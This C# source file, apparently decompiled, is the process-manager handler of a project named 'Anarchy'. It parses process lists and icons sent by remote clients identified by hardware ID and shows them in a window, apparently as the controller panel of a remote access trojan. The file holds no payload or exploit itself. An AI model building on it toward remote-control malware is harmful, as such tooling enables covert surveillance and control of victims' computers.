using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleProcessManager
    {
        public void GetProcess(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormProcessManager formProcessManager;
                formProcessManager = (FormProcessManager)Application.OpenForms["processManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (formProcessManager == null)
                {
                    return;
                }
                if (formProcessManager.Client == null)
                {
                    formProcessManager.Client = client;
                    formProcessManager.listView1.Enabled = true;
                    formProcessManager.timer1.Enabled = true;
                }
                formProcessManager.listView1.Items.Clear();
                formProcessManager.imageList1.Images.Clear();
                string[] array;
                array = unpack_msgpack.ForcePathObject("Message").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                for (int num = 0; num < array.Length; num = num + 2 + 1)
                {
                    if (array[num].Length > 0)
                    {
                        ListViewItem listViewItem;
                        listViewItem = new ListViewItem
                        {
                            Text = Path.GetFileName(array[num])
                        };
                        listViewItem.SubItems.Add(array[num + 1]);
                        listViewItem.ToolTipText = array[num];
                        Image image;
                        image = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
                        formProcessManager.imageList1.Images.Add(array[num + 1], image);
                        listViewItem.ImageKey = array[num + 1];
                        formProcessManager.listView1.Items.Add(listViewItem);
                    }
                }
            }
            catch
            {
            }
        }
    }
}
